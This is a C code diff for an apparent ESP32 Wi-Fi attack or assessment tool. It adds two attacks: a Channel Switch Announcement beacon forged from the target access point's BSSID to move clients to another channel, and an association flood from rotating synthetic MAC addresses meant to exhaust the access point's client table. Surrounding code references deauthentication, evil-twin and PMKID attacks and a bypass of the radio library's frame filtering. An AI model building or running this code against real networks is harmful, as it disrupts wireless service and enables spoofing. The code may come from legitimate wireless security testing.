@@ -27,6 +27,15 @@ bool bas_tx_supported(bas_family_t f)
     case BAS_FAM_PMKID:
     case BAS_FAM_BLE_ADV:
     case BAS_FAM_BLE_TRACKER:
+    case BAS_FAM_ASSOC_FLOOD:
+        /* Association requests are ordinary frames the library does not
+         * refuse, so this family works with or without the bypass. */
+        return true;
+
+    case BAS_FAM_CSA:
+        /* A CSA beacon is a beacon, which the library permits. */
+        return true;
+
     case BAS_FAM_AUTH_FLOOD:
     case BAS_FAM_DISASSOC:
     case BAS_FAM_DEAUTH:
@@ -65,7 +74,7 @@ static uint32_t now_ms(void)
 static bool is_directed(bas_family_t f)
 {
     return f == BAS_FAM_DEAUTH || f == BAS_FAM_DISASSOC ||
-           f == BAS_FAM_AUTH_FLOOD;
+           f == BAS_FAM_AUTH_FLOOD || f == BAS_FAM_ASSOC_FLOOD;
 }
 
 /* PMKID solicitation.
@@ -464,6 +473,31 @@ esp_err_t bas_tx_run(const bas_plan_t *plan,
             }
             break;
         }
+        case BAS_FAM_CSA: {
+            /* Move the cell to a channel far enough away that a client cannot
+             * drift back by accident. Which channel matters less than that it
+             * is not this one. */
+            uint8_t to = (ch <= 6u) ? (uint8_t)(ch + 5u) : (uint8_t)(ch - 5u);
+            if (to < 1u)  { to = 1u; }
+            if (to > 11u) { to = 11u; }
+            bas_frame_synth_mac(synth, 0xC5Au);
+            (void)synth;
+            /* Spoofed from the target's own BSSID: a client only honours a
+             * switch from the AP it is associated with. */
+            len = bas_frame_csa(buf, e->target.bssid, e->target.ssid, ch, to,
+                                (uint8_t)(3u - (seq % 3u)), seq);
+            break;
+        }
+
+        case BAS_FAM_ASSOC_FLOOD:
+            /* A different synthetic station each time, which is what actually
+             * pressures the association table rather than one station
+             * re-asking. */
+            bas_frame_synth_mac(synth, seq + 0x5A00u);
+            len = bas_frame_assoc_req(buf, e->target.bssid, synth,
+                                      e->target.ssid, seq);
+            break;
+
         case BAS_FAM_EVIL_TWIN: {
             /* The one place a name that is not ours goes on air: a duplicate
              * of the network under test, from a synthetic BSSID. Permitted
@@ -484,7 +518,14 @@ esp_err_t bas_tx_run(const bas_plan_t *plan,
                 vTaskDelay(pdMS_TO_TICKS(20));
                 continue;
             }
-            r.tx_errors++;
+            /* The builder refused to construct the frame -- almost always a
+             * family that needs the target's NAME against a hidden network.
+             * That is a targeting problem, not a radio one, and reporting it
+             * as a transmit error sends the operator to debug the wrong half. */
+            r.stopped_by = e->target.hidden ? BAS_ERR_NO_TARGET : BAS_ERR_ARG;
+            ESP_LOGW(TAG, "%s could not be built: %s", bas_family(p.fam)->name,
+                     e->target.hidden ? "target is hidden, no SSID to use"
+                                      : "invalid parameters");
             break;
         }
 
